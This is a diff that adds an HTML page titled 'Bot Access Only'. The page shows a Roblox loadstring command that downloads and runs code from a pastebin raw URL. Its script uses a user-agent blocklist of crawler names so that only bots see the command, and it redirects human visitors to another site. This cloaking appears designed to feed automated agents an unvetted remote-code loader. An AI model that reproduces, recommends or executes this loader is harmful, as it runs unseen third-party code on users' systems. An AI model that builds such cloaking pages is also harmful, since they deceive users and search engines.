@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bot Access Only</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+        
+        body {
+            background: #0a0a0a;
+            color: #00ff00;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .loadstring {
+            font-size: 1.2rem;
+            color: #00ff00;
+            background: #001100;
+            padding: 20px;
+            border-radius: 5px;
+            border: 1px solid #008800;
+            text-align: center;
+            word-break: break-all;
+            max-width: 90%;
+        }
+    </style>
+</head>
+<body>
+    <div class="loadstring" id="loadstring">
+        loadstring(game:HttpGet("https://pastebin.com/raw/rZS6TeBf"))()
+    </div>
+
+    <script>
+        // Ultra-fast bot detection
+        (function() {
+            function isBot() {
+                const ua = navigator.userAgent.toLowerCase();
+                const botIndicators = [
+                    'bot', 'crawler', 'spider', 'googlebot', 'bingbot', 
+                    'slurp', 'duckduckbot', 'baiduspider', 'yandexbot', 
+                    'facebookexternalhit', 'twitterbot', 'rogerbot', 
+                    'linkedinbot', 'embedly', 'quora link preview'
+                ];
+                
+                for (let indicator of botIndicators) {
+                    if (ua.includes(indicator)) return true;
+                }
+                
+                const urlParams = new URLSearchParams(window.location.search);
+                if (urlParams.get('bot') === 'true') return true;
+                
+                return false;
+            }
+
+            if (!isBot()) {
+                window.location.replace('https://skidbin.net');
+            }
+        })();
+    </script>
+</body>
+</html>
